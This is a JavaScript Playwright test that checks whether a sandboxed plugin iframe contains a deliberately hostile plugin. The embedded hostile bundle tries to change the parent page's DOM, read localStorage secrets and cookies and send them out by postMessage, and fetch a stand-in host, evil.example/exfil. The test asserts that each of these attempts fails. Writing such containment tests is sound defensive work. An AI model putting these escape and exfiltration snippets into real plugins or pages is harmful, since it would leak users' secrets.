/**
 * QUOXTRUST F2 — real-browser containment smoke for pluginFrameHost.
 *
 * jsdom cannot enforce iframe opaque-origin isolation or CSP, so this drives a REAL
 * chromium via Playwright and proves the boundary end-to-end against a HOSTILE plugin:
 * the plugin tries to reach the parent DOM, read parent storage, and hit the network;
 * the parent asserts every attempt failed and that only the mediated RPC worked.
 *
 * Run: node src/services/pluginFrameHost.browser.mjs   (exit 0 = contained)
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import { chromium } from 'playwright';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
// pluginFrameHost.js imports the build-time virtual module; resolve it here with the same esbuild bundle.
import { buildFrameDepsCode } from '../../scripts/vite-plugin-frame-deps.mjs';
const moduleSrc = readFileSync(path.join(__dirname, 'pluginFrameHost.js'), 'utf8')
    .replace(/^import frameDepsCode from 'virtual:quox-frame-deps';$/m,
        `const frameDepsCode = ${JSON.stringify(await buildFrameDepsCode())};`);

// A hostile plugin bundle. It runs INSIDE the sandboxed frame and tries every escape.
const HOSTILE_BUNDLE = `
  // 1. reach the parent document
  try { parent.document.title = 'PWNED'; window.__gotParentDoc = true; } catch (e) {}
  try { top.document.body.setAttribute('data-pwned','1'); } catch (e) {}
  // 2. read parent storage / cookies and exfil via raw postMessage (no channel token)
  try { var s = parent.localStorage.getItem('HOST_SECRET'); parent.postMessage({ __exfil: s || 'none' }, '*'); } catch (e) { parent.postMessage({ __exfil: 'threw' }, '*'); }
  try { parent.postMessage({ __cookie: parent.document.cookie }, '*'); } catch (e) {}
  // 3. direct network (must be blocked by connect-src 'none')
  try { fetch('https://evil.example/exfil').catch(function(){}); } catch (e) {}
  try { fetch('/collector/api/v1/whoami', { credentials: 'include' }).catch(function(){}); } catch (e) {}
  // 4. legit mediated call (proves the ONLY channel that works is the RPC)
  try { window.__quoxPluginRegister({ routes: [{ path: '/x', title: 'X' }] }); } catch (e) {}
  try { window.quox.getUser().then(function (u) { parent.postMessage({ __quoxPluginFrame: 0, mediatedUser: u }, '*'); }); } catch (e) {}
`;

const HARNESS = `<!doctype html><html><head><meta charset="utf-8"></head><body>
<div id="mount"></div>
<script type="module">
import { createPluginFrame, createHostMediator } from '/pluginFrameHost.js';
window.__exfilSeen = [];
window.__mediatedUser = null;
window.addEventListener('message', (e) => {
  const d = e.data || {};
  if ('__exfil' in d) window.__exfilSeen.push({ exfil: d.__exfil });
  if ('__cookie' in d) window.__exfilSeen.push({ cookie: d.__cookie });
  if (d.mediatedUser) window.__mediatedUser = d.mediatedUser;
});
localStorage.setItem('HOST_SECRET', 'super-secret-host-value');
document.title = 'HOST_OK';
const mediator = createHostMediator({
  pluginId: 'hostile',
  getAuthContext: () => ({ userId: 'u1', orgId: 'ORG', role: 'admin', tier: 'pro', accessToken: 'TOKEN_NEVER_LEAK' }),
  collectorBase: '/collector',
  doFetch: async () => ({ ok: true, status: 200, json: async () => ({ value: null, data: {} }), text: async () => '{}' }),
});
const frame = createPluginFrame({
  pluginId: 'hostile',
  bundleCode: ${JSON.stringify(HOSTILE_BUNDLE)},
  mountEl: document.getElementById('mount'),
  mediator,
});
window.__frame = frame;
frame.registration.then((s) => { window.__registered = s; }).catch(() => {});
window.__ready = true;
</script>
</body></html>`;

const netHits = [];

const browser = await chromium.launch();
const page = await browser.newPage();
page.on('request', (r) => { const u = r.url(); if (u.includes('evil.example') || u.includes('/collector/')) netHits.push(u); });

// Single interceptor: everything is fulfilled, nothing hits the real network (no DNS).
// A request to evil.example/collector reaching HERE proves the frame was NOT blocked;
// connect-src 'none' should stop it before it ever becomes a request.
await page.route('**/*', (route) => {
    const u = route.request().url();
    if (u.endsWith('/pluginFrameHost.js')) return route.fulfill({ contentType: 'text/javascript', body: moduleSrc });
    if (u.includes('/harness.html')) return route.fulfill({ contentType: 'text/html', body: HARNESS });
    if (u.includes('evil.example') || u.includes('/collector/')) return route.fulfill({ status: 200, body: 'x' });
    return route.fulfill({ status: 404, body: '' });
});

await page.goto('http://localhost.test/harness.html');
await page.waitForFunction('window.__ready === true');
// give the frame time to boot, run the hostile bundle, and register
await page.waitForTimeout(1500);

const results = await page.evaluate(async () => {
    const out = {};
    out.title = document.title;                                  // must stay HOST_OK
    out.pwnedAttr = document.body.getAttribute('data-pwned');    // must be null
    out.exfil = window.__exfilSeen;                              // secret must not appear
    out.mediatedUser = window.__mediatedUser;                    // RPC must have worked
    out.registered = window.__registered || null;
    // Opaque-origin proof: parent cannot read the sandboxed frame's document.
    const iframe = document.querySelector('iframe');
    try { out.contentDocReadable = !!iframe.contentDocument && !!iframe.contentDocument.body; }
    catch (e) { out.contentDocReadable = 'threw:' + e.name; }
    return out;
});

await browser.close();

// ── Assertions ──────────────────────────────────────────────────────────────
const fails = [];
if (results.title !== 'HOST_OK') fails.push(`parent title was mutated: ${results.title}`);
if (results.pwnedAttr !== null) fails.push(`parent DOM was mutated: data-pwned=${results.pwnedAttr}`);
const leaked = results.exfil.find((e) => (e.exfil && e.exfil.includes('super-secret')) || (e.cookie && e.cookie.length));
if (leaked) fails.push(`host secret/cookie leaked: ${JSON.stringify(leaked)}`);
if (results.contentDocReadable === true) fails.push('parent could read the sandboxed frame document (NOT opaque origin)');
const evilHit = netHits.find((u) => u.includes('evil.example'));
if (evilHit) fails.push(`frame reached the network despite connect-src none: ${evilHit}`);
// Positive control: the mediated RPC is the one channel that DID work, and it returned
// minimal context with no token.
if (!results.mediatedUser) fails.push('mediated getUser RPC did not work (frame has no working channel at all?)');
else {
    if (results.mediatedUser.orgId !== 'ORG') fails.push('mediated user missing host-attached org');
    if (JSON.stringify(results.mediatedUser).includes('TOKEN')) fails.push('mediated user leaked a token');
}
if (!results.registered) fails.push('plugin registration (declarative surfaces) did not arrive over RPC');

console.log('F2 containment smoke results:', JSON.stringify(results, null, 2));
console.log('network hits (should have NO evil.example):', JSON.stringify(netHits));
if (fails.length) {
    console.error('\n❌ F2 CONTAINMENT FAILED:\n - ' + fails.join('\n - '));
    process.exit(1);
}
console.log('\n✅ F2 CONTAINMENT PASSED: hostile plugin could not reach parent DOM, storage, cookies, or the network; only the mediated RPC worked (org host-attached, no token).');
process.exit(0);
